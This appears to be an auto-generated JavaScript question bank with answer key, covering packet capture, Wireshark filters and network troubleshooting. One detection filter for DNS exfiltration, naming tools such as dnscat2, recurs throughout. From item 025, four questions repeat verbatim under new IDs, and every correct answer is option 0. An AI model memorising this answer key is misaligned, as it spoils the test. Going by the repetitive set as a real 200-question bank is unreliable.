// Module 8 Question Bank: Traffic Analysis, Wireshark & Capstone Report
// Generated automatically with 200 rigorous institutional questions (100 Medium, 100 Difficult)

export const module8QuestionBank = [
  {
    "id": "q_c2_m8_001",
    "topic": "Packet Capture Architecture",
    "difficulty": "medium",
    "q": "What is the fundamental operational difference between a passive hardware Network TAP and a switch SPAN/mirror port?",
    "options": [
      "A Network TAP is a dedicated physical hardware device spliced into the link that copies 100% of packets with zero loss; a SPAN port copies traffic via switch software/ASICs and can drop packets under high link utilization.",
      "A Network TAP operates only on wireless networks, while SPAN operates only on copper.",
      "A SPAN port requires cutting the physical fiber optic cable, while a TAP does not.",
      "A Network TAP decrypts TLS traffic automatically, while SPAN cannot."
    ],
    "correct": 0,
    "explanation": "A hardware TAP physically replicates the electrical or optical signal with zero latency and zero packet loss. A SPAN (mirror) port relies on switch internal buffers and CPU; under congestion, the switch prioritizes production forwarding and drops mirrored packets."
  },
  {
    "id": "q_c2_m8_002",
    "topic": "Packet Capture Architecture",
    "difficulty": "medium",
    "q": "Why does an ordinary laptop plugged into a standard access switch port fail to capture unicast traffic exchanged between two neighboring workstations?",
    "options": [
      "Because a switch maintains a CAM table and forwards unicast frames strictly out of the specific physical port where the destination MAC was learned, rather than broadcasting them to all ports.",
      "Because standard Ethernet cables block all packets that contain TCP headers.",
      "Because operating systems refuse to process packets whose source IP is in the same subnet.",
      "Because Wireshark only runs on servers that possess hardware cryptographic accelerators."
    ],
    "correct": 0,
    "explanation": "Unlike legacy shared hubs, switches deliver unicast frames exclusively to the destination port. A device on an access port sees only its own unicast traffic and subnet broadcast/multicast frames (such as ARP and DHCP Discovers)."
  },
  {
    "id": "q_c2_m8_003",
    "topic": "Packet Capture Architecture",
    "difficulty": "medium",
    "q": "What is Snapshot Length (Snaplen) in packet capture tools, and why is it used?",
    "options": [
      "A configuration that captures only the first N bytes of each packet (headers) rather than the full payload, saving storage space and reducing privacy risks.",
      "The maximum physical length of an Ethernet cable before signal degradation occurs.",
      "The time interval between automated Wireshark screen refreshes.",
      "A security feature that automatically takes webcam photos of unauthorized network users."
    ],
    "correct": 0,
    "explanation": "Snaplen limits how many bytes of each frame are saved to disk (e.g. 96 or 128 bytes). This captures complete Layer 2, 3, and 4 protocol headers for analysis while discarding sensitive application payload data and drastically reducing capture file size."
  },
  {
    "id": "q_c2_m8_004",
    "topic": "Packet Capture Architecture",
    "difficulty": "medium",
    "q": "What is the fundamental difference between Full Packet Capture (FPC) and Flow Records (NetFlow / IPFIX)?",
    "options": [
      "Full Packet Capture stores the complete raw frame headers and payloads; Flow Records store only aggregated statistical metadata (5-tuple, timestamps, byte/packet counts) without packet content.",
      "NetFlow stores all encrypted passwords in cleartext, whereas FPC does not.",
      "FPC runs only on mobile smartphones, while NetFlow runs only on supercomputers.",
      "Flow records require cutting physical fiber cables, while FPC is passive."
    ],
    "correct": 0,
    "explanation": "Full Packet Capture provides complete ground-truth packet bytes (high storage, maximum fidelity). Flow records (NetFlow/IPFIX) summarize conversations into statistical records (who talked to whom, when, and how much), enabling months of macroscopic retention with minimal storage."
  },
  {
    "id": "q_c2_m8_005",
    "topic": "Packet Capture Architecture",
    "difficulty": "medium",
    "q": "Why must a digital forensic analyst compute a cryptographic hash (e.g. SHA-256) of a packet capture file immediately upon acquisition?",
    "options": [
      "To establish a verifiable Chain of Custody, proving that the captured network evidence has not been altered, tampered with, or corrupted during analysis.",
      "To compress the PCAP file so it can fit on a standard floppy disk.",
      "To decrypt any TLS 1.3 encrypted sessions contained in the capture.",
      "To automatically forward the file to the national cyber police repository."
    ],
    "correct": 0,
    "explanation": "In digital forensics, evidence integrity must be mathematically verifiable. Generating a SHA-256 hash immediately after capture proves in court or an audit that the evidence presented matches the exact bytes captured from the wire."
  },
  {
    "id": "q_c2_m8_006",
    "topic": "Capture Filters vs Display Filters",
    "difficulty": "medium",
    "q": "What is the primary difference in execution between a Capture Filter and a Wireshark Display Filter?",
    "options": [
      "A Capture Filter (BPF) runs in the kernel before packets are saved to disk, permanently discarding non-matching packets; a Display Filter runs in the GUI on an already-saved file, non-destructively hiding packets.",
      "Capture Filters use Wireshark syntax, while Display Filters use BPF syntax.",
      "Display Filters can only be used on Windows, while Capture Filters are exclusive to Linux.",
      "A Display Filter permanently deletes packets from the PCAP file on disk."
    ],
    "correct": 0,
    "explanation": "Capture filters (using BPF syntax) determine which packets are written to disk; non-matching packets are discarded forever. Display filters (using Wireshark field syntax) merely filter which packets are visible on screen, never modifying or losing data in the file."
  },
  {
    "id": "q_c2_m8_007",
    "topic": "Capture Filters vs Display Filters",
    "difficulty": "medium",
    "q": "Which of the following represents a valid Berkeley Packet Filter (BPF) syntax expression to capture traffic to or from host 172.30.8.10 on TCP port 443?",
    "options": [
      "host 172.30.8.10 and tcp port 443",
      "ip.addr == 172.30.8.10 && tcp.port == 443",
      "SELECT * FROM packets WHERE host=172.30.8.10 AND port=443",
      "filter: ip(172.30.8.10) + port(443)"
    ],
    "correct": 0,
    "explanation": "\"host 172.30.8.10 and tcp port 443\" is standard BPF syntax. (Option B is a Wireshark display filter, not a BPF capture filter)."
  },
  {
    "id": "q_c2_m8_008",
    "topic": "Capture Filters vs Display Filters",
    "difficulty": "medium",
    "q": "Why does the Wireshark display filter \"ip.addr != 10.0.0.1\" fail to isolate traffic that does not involve host 10.0.0.1?",
    "options": [
      "Because every IP packet has two addresses (Source and Destination); if either address is not 10.0.0.1, the condition evaluates to TRUE, matching almost every packet.",
      "Because Wireshark does not support the \"!=\" inequality operator.",
      "Because 10.0.0.1 is an unroutable IP address reserved by the military.",
      "Because the operating system firewall blocks inequality comparisons."
    ],
    "correct": 0,
    "explanation": "A packet has both ip.src and ip.dst. In a packet from 10.0.0.1 to 10.0.0.2, the destination address (10.0.0.2) is not 10.0.0.1, so \"ip.addr != 10.0.0.1\" evaluates to TRUE! The mathematically correct filter is \"!(ip.addr == 10.0.0.1)\"."
  },
  {
    "id": "q_c2_m8_009",
    "topic": "Capture Filters vs Display Filters",
    "difficulty": "medium",
    "q": "Which Wireshark display filter correctly matches all packets with source or destination IP within the CIDR block 172.30.0.0/24?",
    "options": [
      "ip.addr == 172.30.0.0/24",
      "net 172.30.0.0/24",
      "ip.subnet = 172.30.0.0 mask 255.255.255.0",
      "ip.cidr eq \"172.30.0.0/24\""
    ],
    "correct": 0,
    "explanation": "Wireshark display filters natively support CIDR notation: \"ip.addr == 172.30.0.0/24\" matches any packet whose source or destination IP falls inside that /24 subnet. (\"net 172.30.0.0/24\" is BPF capture filter syntax)."
  },
  {
    "id": "q_c2_m8_010",
    "topic": "Wireshark Display Filters in Practice",
    "difficulty": "medium",
    "q": "Which Wireshark display filter isolates the first packet of a TCP 3-way handshake (the connection request)?",
    "options": [
      "tcp.flags.syn == 1 && tcp.flags.ack == 0",
      "tcp.flags.reset == 1",
      "tcp.port == 80 && tcp.flags.fin == 1",
      "tcp.handshake eq \"SYN\""
    ],
    "correct": 0,
    "explanation": "In the TCP 3-way handshake, the initial connection request packet has the SYN flag set (1) and the ACK flag cleared (0). The second packet (SYN-ACK) has both flags set."
  },
  {
    "id": "q_c2_m8_011",
    "topic": "Wireshark Display Filters in Practice",
    "difficulty": "medium",
    "q": "What Wireshark display filter extracts all DNS responses that indicate the requested domain name does not exist (NXDOMAIN)?",
    "options": [
      "dns.flags.response == 1 && dns.flags.rcode == 3",
      "dns.error == \"NXDOMAIN\"",
      "udp.port == 53 && dns.count == 0",
      "dns.status eq 404"
    ],
    "correct": 0,
    "explanation": "In the DNS protocol, a response is identified by dns.flags.response == 1, and the response code (rcode) for \"Non-Existent Domain\" (NXDOMAIN) is 3."
  },
  {
    "id": "q_c2_m8_012",
    "topic": "Wireshark Display Filters in Practice",
    "difficulty": "medium",
    "q": "Which Wireshark display filter isolates all HTTP responses indicating client or server errors (status codes 400 and higher)?",
    "options": [
      "http.response.code >= 400",
      "http.error == true",
      "tcp.port == 80 && http.status != 200",
      "http.failed >= 1"
    ],
    "correct": 0,
    "explanation": "\"http.response.code >= 400\" matches all 4xx (Client Error) and 5xx (Server Error) HTTP status codes."
  },
  {
    "id": "q_c2_m8_013",
    "topic": "Wireshark Display Filters in Practice",
    "difficulty": "medium",
    "q": "How can an analyst isolate TLS ClientHello messages to inspect the Server Name Indication (SNI) of encrypted websites being contacted?",
    "options": [
      "tls.handshake.type == 1",
      "tls.record.type == 23",
      "ssl.encryption == 1",
      "tcp.payload contains \"HTTPS\""
    ],
    "correct": 0,
    "explanation": "In TLS, handshake message type 1 represents the ClientHello. Filtering \"tls.handshake.type == 1\" extracts all connection initialization packets, allowing analysts to inspect the cleartext Server Name Indication (SNI) extension."
  },
  {
    "id": "q_c2_m8_014",
    "topic": "Wireshark Display Filters in Practice",
    "difficulty": "medium",
    "q": "What display filter identifies TCP packets that Wireshark analyzes as retransmissions, indicating packet loss or congestion along the path?",
    "options": [
      "tcp.analysis.retransmission",
      "tcp.lost.packets > 0",
      "ip.flags.resend == 1",
      "tcp.error.duplicate == true"
    ],
    "correct": 0,
    "explanation": "Wireshark's TCP analysis engine tracks sequence numbers. If a packet is seen with a sequence number identical to a previous unacknowledged segment, it flags it as \"tcp.analysis.retransmission\"."
  },
  {
    "id": "q_c2_m8_015",
    "topic": "Statistics & Macroscopic Telemetry",
    "difficulty": "medium",
    "q": "What high-level architectural insight is provided by Wireshark's Protocol Hierarchy statistics window?",
    "options": [
      "A tree breakdown showing the exact distribution of traffic across protocols by frame count, byte volume, and percentage of the total capture.",
      "A real-time list of user passwords typed into web browsers.",
      "The physical GPS coordinates of every connected switch and router.",
      "An automated estimate of the monetary value of data traversing the link."
    ],
    "correct": 0,
    "explanation": "Protocol Hierarchy (Statistics -> Protocol Hierarchy) summarizes how traffic divides across Ethernet, IPv4/IPv6, TCP/UDP, and application layer protocols, instantly revealing unexpected protocols or high-volume anomalies."
  },
  {
    "id": "q_c2_m8_016",
    "topic": "Statistics & Macroscopic Telemetry",
    "difficulty": "medium",
    "q": "What core investigative question does Wireshark's \"Conversations\" statistics window answer for a network analyst?",
    "options": [
      "\"Who talked to whom, how much data was transferred, and for how long?\"",
      "\"Which employees logged into their computers before 09:00 AM?\"",
      "\"What brand of computer monitor is attached to each workstation?\"",
      "\"Which web servers have expired TLS certificates?\""
    ],
    "correct": 0,
    "explanation": "The Conversations window aggregates traffic by endpoint pairs across Layer 2 (Ethernet), Layer 3 (IPv4/IPv6), and Layer 4 (TCP/UDP), listing packet counts, byte volumes, and conversation durations."
  },
  {
    "id": "q_c2_m8_017",
    "topic": "Statistics & Macroscopic Telemetry",
    "difficulty": "medium",
    "q": "In a Wireshark I/O Graph plotting traffic volume over time, what visual pattern strongly indicates an active malware Command-and-Control (C2) beacon?",
    "options": [
      "Small, identical data spikes repeating at regular, fixed time intervals (e.g. 60 seconds) with zero traffic in between.",
      "A continuous, flat line of zero bytes across the entire duration.",
      "A single massive spike that saturates the full gigabit link and never repeats.",
      "A completely random white-noise distribution resembling thermal noise."
    ],
    "correct": 0,
    "explanation": "Malware C2 beacons typically check in with their control servers on a fixed schedule (e.g., every 60 seconds) to receive tasking. In an I/O graph, this manifests as a distinct, periodic comb-like pattern of small spikes."
  },
  {
    "id": "q_c2_m8_018",
    "topic": "Troubleshooting Connection Failures",
    "difficulty": "medium",
    "q": "When an application attempts to connect to a remote server and the client operating system retransmits TCP SYN packets multiple times with exponential backoff until timing out, what is the most likely root cause on the wire?",
    "options": [
      "A firewall DROP rule (or a dead network route) along the path is silently discarding the packets; the service may be running, but packets never reach it or return.",
      "The server is functioning normally and returned an HTTP 200 OK.",
      "The client has run out of physical disk space.",
      "The DNS server returned an authoritative NXDOMAIN response."
    ],
    "correct": 0,
    "explanation": "Unanswered SYNs that trigger retransmissions and timeout errors (e.g. curl exit code 28) represent the signature of a DROP rule or severed path: packets are silently discarded without any response."
  },
  {
    "id": "q_c2_m8_019",
    "topic": "Troubleshooting Connection Failures",
    "difficulty": "medium",
    "q": "When a client sends a TCP SYN and immediately receives a TCP packet with the RST and ACK flags set within less than a millisecond, what does this indicate?",
    "options": [
      "The destination host is online and reachable, but no application process or service is currently bound or listening on that destination port.",
      "The physical Ethernet cable has been unplugged from the wall jack.",
      "The entire internet routing backbone has experienced a BGP route hijack.",
      "The client's network card driver has crashed."
    ],
    "correct": 0,
    "explanation": "An immediate RST/ACK in response to a SYN means the packet successfully reached the destination operating system, but the kernel rejected it because no daemon was listening on that port (Connection Refused, curl exit code 7)."
  },
  {
    "id": "q_c2_m8_020",
    "topic": "Troubleshooting Connection Failures",
    "difficulty": "medium",
    "q": "What packet signature on the wire indicates that an application connection failure is caused by a typographical error in the target domain name?",
    "options": [
      "The DNS resolver returns a response packet with the rcode field set to 3 (NXDOMAIN / No Such Name).",
      "The client transmits an ARP request with a broadcast destination MAC address.",
      "The web server returns an HTTP 500 Internal Server Error status code.",
      "The client sends a TCP FIN packet immediately after receiving the SYN-ACK."
    ],
    "correct": 0,
    "explanation": "When a client queries a misspelled or non-existent domain (e.g. apps.rk-lab.example instead of app.rk-lab.example), authoritative DNS resolvers respond with rcode 3 (NXDOMAIN), confirming that the name does not exist in the zone."
  },
  {
    "id": "q_c2_m8_021",
    "topic": "Troubleshooting Connection Failures",
    "difficulty": "medium",
    "q": "What network anomaly occurs when small HTTP requests succeed, but large file downloads or bulk database queries freeze and hang indefinitely?",
    "options": [
      "A Path MTU (PMTU) black hole, caused by an intermediate router dropping oversized packets while a firewall blocks the ICMP \"Fragmentation Needed\" (Type 3 Code 4) error packets.",
      "The server's hard drive has run out of inode space.",
      "The client's DHCP lease time has expired.",
      "The switch has elected a new Spanning Tree Root Bridge."
    ],
    "correct": 0,
    "explanation": "When large packets exceed an intermediate link's MTU and have the Don't Fragment (DF) flag set, routers drop them and send ICMP Type 3 Code 4. If firewalls drop ICMP, the sender never learns to reduce its packet size, causing large transfers to hang permanently (PMTU black hole)."
  },
  {
    "id": "q_c2_m8_022",
    "topic": "Troubleshooting Connection Failures",
    "difficulty": "medium",
    "q": "If a workstation continuously transmits ARP requests (\"Who has 192.168.1.1? Tell 192.168.1.50\") but receives zero ARP replies, what is the primary diagnosis?",
    "options": [
      "Layer 2/3 local disconnect: Either the default gateway is offline, the client is plugged into the wrong VLAN, or the client has an incorrect subnet mask configured.",
      "The DNS root servers are experiencing a distributed denial of service attack.",
      "The web application is throwing an unhandled SQL exception.",
      "The client's TLS 1.3 cipher suite is incompatible with the server."
    ],
    "correct": 0,
    "explanation": "ARP resolves Layer 2 addresses on the local broadcast domain. If ARP requests for the default gateway receive no answer, the gateway is either physically powered off, the port is in the wrong VLAN, or the subnet configuration is mismatched."
  },
  {
    "id": "q_c2_m8_023",
    "topic": "Technical Network Reporting",
    "difficulty": "medium",
    "q": "Why must a formal network analysis report strictly maintain a clear separation between \"Facts\" and \"Inferences\"?",
    "options": [
      "Facts represent unassailable wire observations (e.g. \"Frames 17-20 show four unanswered SYNs\"); Inferences represent technical deductions regarding root cause (e.g. \"This indicates a firewall DROP rule\").",
      "Because legal regulations prohibit engineers from using the word \"firewall\" in technical reports.",
      "To make the report longer and justify higher billing rates to clients.",
      "Because Wireshark output cannot be trusted without secondary confirmation."
    ],
    "correct": 0,
    "explanation": "Maintaining strict epistemological separation ensures that peer reviewers and managers know what was objectively observed on the wire versus what was deduced. Citing exact frame numbers and timestamps anchors findings in indisputable fact."
  },
  {
    "id": "q_c2_m8_024",
    "topic": "Technical Network Reporting",
    "difficulty": "medium",
    "q": "What essential metadata must be documented in the \"Scope and Authority\" section of an enterprise network analysis report?",
    "options": [
      "The name and role of the authorizing manager, the exact network interface captured, the physical/logical capture vantage point, the date and time window, and the precise BPF filter applied.",
      "The serial numbers of all employee mobile phones in the building.",
      "The brand of coffee consumed by the SOC analysts during the shift.",
      "The personal residential addresses of the network engineering team."
    ],
    "correct": 0,
    "explanation": "Scope and authority prove that the capture was legally commissioned, properly authorized, and bounded by data minimization policies, protecting both the analyst and the organization from privacy and liability disputes."
  },
  {
    "id": "q_c2_m8_025",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_026",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_027",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_028",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_029",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_030",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_031",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_032",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_033",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_034",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_035",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_036",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_037",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_038",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_039",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_040",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_041",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_042",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
  },
  {
    "id": "q_c2_m8_043",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "Why should an analyst configure Wireshark to display timestamps as \"UTC Date and Time of Day\" when conducting an incident response investigation?",
    "options": [
      "To accurately synchronize and correlate packet capture events with central SIEM alerts, server syslogs, and firewall connection tables.",
      "To convert timestamps into Roman numerals.",
      "Because UTC timestamps prevent the capture file from being compressed.",
      "To bypass local daylight saving time electrical grid fluctuations."
    ],
    "correct": 0,
    "explanation": "Relative timestamps (seconds since start of capture) cannot be correlated against external logs. Using absolute UTC timestamps allows precise multi-source correlation with host logs and SIEM events."
  },
  {
    "id": "q_c2_m8_044",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "What is the significance of seeing an ICMP \"Time-to-Live exceeded in transit\" (Type 11 Code 0) packet during network troubleshooting?",
    "options": [
      "A packet's TTL field decremented to 0, indicating a Layer 3 routing loop where packets circulate endlessly between misconfigured routers.",
      "The server's physical system clock has experienced clock drift.",
      "The client's DHCP lease time has reached its 50% renewal mark.",
      "The web browser session has been idle for more than 15 minutes."
    ],
    "correct": 0,
    "explanation": "Every router decrements the IPv4 TTL (or IPv6 Hop Limit) by 1. If routers have mutually pointing routes, packets loop until TTL hits 0, triggering an ICMP Type 11 Code 0 error."
  },
  {
    "id": "q_c2_m8_045",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "When investigating an alert of data exfiltration over DNS, which Wireshark display filter isolates DNS queries whose domain name length is abnormally long?",
    "options": [
      "dns.qry.name.len > 50",
      "dns.payload.size == 1500",
      "dns.error == \"TOO_LONG\"",
      "udp.port == 53 && dns.flags.opcode == 5"
    ],
    "correct": 0,
    "explanation": "Filtering for unusually long domain query strings (dns.qry.name.len > 50) directly exposes high-entropy subdomains used by DNS tunneling and exfiltration tools like iodine and dnscat2."
  },
  {
    "id": "q_c2_m8_046",
    "topic": "Traffic Analysis, Forensics & Troubleshooting Methodology",
    "difficulty": "medium",
    "q": "In Wireshark, what does a TCP Zero Window notification from a receiving endpoint signify?",
    "options": [
      "The receiving host's application buffer is completely full, and it cannot accept any more data until the application processes what is in memory.",
      "The network switch has completely lost electrical power.",
      "The firewall has blocked all UDP packets.",
      "The client has successfully terminated the TLS session."
    ],
    "correct": 0,
    "explanation": "A TCP Zero Window is flow control in action: the receiver advertises Window Size = 0, instructing the sender to stop transmitting data until its internal application buffer drains and opens window space."
